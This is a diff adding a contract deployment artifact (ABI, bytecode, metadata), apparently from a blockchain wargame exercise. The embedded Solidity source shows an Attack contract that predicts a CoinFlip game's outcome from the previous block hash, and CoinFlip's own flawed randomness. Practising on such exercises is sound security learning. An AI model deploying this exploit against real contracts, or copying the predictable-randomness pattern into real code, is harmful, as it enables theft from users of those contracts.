@@ -1,0 +1,170 @@
+{
+  "address": "0x8EF7b4C8d5c6134EC19bF53f1E2D68e8d6ee39eb",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_coinFlipAddress",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "FACTOR",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "blockValue",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "coinState",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "owner",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x28a284c77eb38ecfe30e0fb2b21caa6d39ede723032976943411e2d0bb96b11c",
+  "receipt": {
+    "to": null,
+    "from": "0x82D97c310FFb92C5D96f286431248B7494E0A3b9",
+    "contractAddress": "0x8EF7b4C8d5c6134EC19bF53f1E2D68e8d6ee39eb",
+    "transactionIndex": 23,
+    "gasUsed": "365492",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x83256365afa5530e7043bee45a4876cf11b95988da39d0f12a47a9fd0814dccf",
+    "transactionHash": "0x28a284c77eb38ecfe30e0fb2b21caa6d39ede723032976943411e2d0bb96b11c",
+    "logs": [],
+    "blockNumber": 8582482,
+    "cumulativeGasUsed": "3611849",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x6CC5b164aacF698F0b8b781f6aEB440C5E1e5f9a"
+  ],
+  "numDeployments": 2,
+  "solcInputHash": "ec8277d90a5d142e2e0001c0160b7d44",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_coinFlipAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"FACTOR\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"blockValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"coinState\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Attack.sol\":\"Attack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Attack.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./CoinFlip.sol\\\";\\n\\ncontract Attack {\\n    uint256 public blockValue;\\n    uint256 public FACTOR =\\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\\n    uint256 public coinState;\\n    address public owner;\\n    CoinFlip coinFlip;\\n\\n    constructor(address _coinFlipAddress) {\\n        coinFlip = CoinFlip(_coinFlipAddress);\\n    }\\n\\n    function attack() public {\\n        blockValue = uint256(blockhash(block.number - 1));\\n        coinState = blockValue / FACTOR;\\n\\n        if (coinState == 1) {\\n            coinFlip.flip(true);\\n        } else {\\n            coinFlip.flip(false);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x2db3e415b93ae52a671f6088c0d81eb22001d53a8b023013d2537121c6127905\",\"license\":\"GPL-3.0\"},\"contracts/CoinFlip.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract CoinFlip {\\n    uint256 public consecutiveWins;\\n    uint256 lastHash;\\n    uint256 FACTOR =\\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\\n\\n    constructor() {\\n        consecutiveWins = 0;\\n    }\\n\\n    function flip(bool _guess) public returns (bool) {\\n        uint256 blockValue = uint256(blockhash(block.number - 1));\\n\\n        if (lastHash == blockValue) {\\n            revert();\\n        }\\n\\n        lastHash = blockValue;\\n        uint256 coinFlip = blockValue / FACTOR;\\n        bool side = coinFlip == 1 ? true : false;\\n\\n        if (side == _guess) {\\n            consecutiveWins++;\\n            return true;\\n        } else {\\n            consecutiveWins = 0;\\n            return false;\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xaa4908b27bf8accda69d71727a02150360a1c36d063db840b2672afc6fec2729\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506040516105fb3803806105fb833981810160405281019061005691906100b2565b80600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610124565b6000815190506100ac8161010d565b92915050565b6000602082840312156100c457600080fd5b60006100d28482850161009d565b91505092915050565b60006100e6826100ed565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610116816100db565b811461012157600080fd5b50565b6104c8806101336000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806335815b951461005c5780638da5cb5b1461007a5780639e5faafc14610098578063e1932091146100a2578063f852be69146100c0575b600080fd5b6100646100de565b6040516100719190610355565b60405180910390f35b6100826100e4565b60405161008f919061031f565b60405180910390f35b6100a061010a565b005b6100aa6102a8565b6040516100b79190610355565b60405180910390f35b6100c86102ae565b6040516100d59190610355565b60405180910390f35b60015481565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60014361011791906103a1565b4060001c6000819055506001546000546101319190610370565b600281905550600160025414156101f657600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760016040518263ffffffff1660e01b815260040161019e919061033a565b602060405180830381600087803b1580156101b857600080fd5b505af11580156101cc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101f091906102c9565b506102a6565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760006040518263ffffffff1660e01b8152600401610252919061033a565b602060405180830381600087803b15801561026c57600080fd5b505af1158015610280573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102a491906102c9565b505b565b60025481565b60005481565b6000815190506102c38161047b565b92915050565b6000602082840312156102db57600080fd5b60006102e9848285016102b4565b91505092915050565b6102fb816103d5565b82525050565b61030a816103e7565b82525050565b61031981610413565b82525050565b600060208201905061033460008301846102f2565b92915050565b600060208201905061034f6000830184610301565b92915050565b600060208201905061036a6000830184610310565b92915050565b600061037b82610413565b915061038683610413565b9250826103965761039561044c565b5b828204905092915050565b60006103ac82610413565b91506103b783610413565b9250828210156103ca576103c961041d565b5b828203905092915050565b60006103e0826103f3565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b610484816103e7565b811461048f57600080fd5b5056fea26469706673582212201f26aeaeefc11c35413a4e13f3c65927da64b1f4b0ea7a2bc9a3630eb220f4a964736f6c63430008000033",
+  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100575760003560e01c806335815b951461005c5780638da5cb5b1461007a5780639e5faafc14610098578063e1932091146100a2578063f852be69146100c0575b600080fd5b6100646100de565b6040516100719190610355565b60405180910390f35b6100826100e4565b60405161008f919061031f565b60405180910390f35b6100a061010a565b005b6100aa6102a8565b6040516100b79190610355565b60405180910390f35b6100c86102ae565b6040516100d59190610355565b60405180910390f35b60015481565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60014361011791906103a1565b4060001c6000819055506001546000546101319190610370565b600281905550600160025414156101f657600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760016040518263ffffffff1660e01b815260040161019e919061033a565b602060405180830381600087803b1580156101b857600080fd5b505af11580156101cc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101f091906102c9565b506102a6565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760006040518263ffffffff1660e01b8152600401610252919061033a565b602060405180830381600087803b15801561026c57600080fd5b505af1158015610280573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102a491906102c9565b505b565b60025481565b60005481565b6000815190506102c38161047b565b92915050565b6000602082840312156102db57600080fd5b60006102e9848285016102b4565b91505092915050565b6102fb816103d5565b82525050565b61030a816103e7565b82525050565b61031981610413565b82525050565b600060208201905061033460008301846102f2565b92915050565b600060208201905061034f6000830184610301565b92915050565b600060208201905061036a6000830184610310565b92915050565b600061037b82610413565b915061038683610413565b9250826103965761039561044c565b5b828204905092915050565b60006103ac82610413565b91506103b783610413565b9250828210156103ca576103c961041d565b5b828203905092915050565b60006103e0826103f3565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b610484816103e7565b811461048f57600080fd5b5056fea26469706673582212201f26aeaeefc11c35413a4e13f3c65927da64b1f4b0ea7a2bc9a3630eb220f4a964736f6c63430008000033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 4,
+        "contract": "contracts/Attack.sol:Attack",
+        "label": "blockValue",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 7,
+        "contract": "contracts/Attack.sol:Attack",
+        "label": "FACTOR",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 9,
+        "contract": "contracts/Attack.sol:Attack",
+        "label": "coinState",
+        "offset": 0,
+        "slot": "2",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 11,
+        "contract": "contracts/Attack.sol:Attack",
+        "label": "owner",
+        "offset": 0,
+        "slot": "3",
+        "type": "t_address"
+      },
+      {
+        "astId": 14,
+        "contract": "contracts/Attack.sol:Attack",
+        "label": "coinFlip",
+        "offset": 0,
+        "slot": "4",
+        "type": "t_contract(CoinFlip)149"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      },
+      "t_contract(CoinFlip)149": {
+        "encoding": "inplace",
+        "label": "contract CoinFlip",
+        "numberOfBytes": "20"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
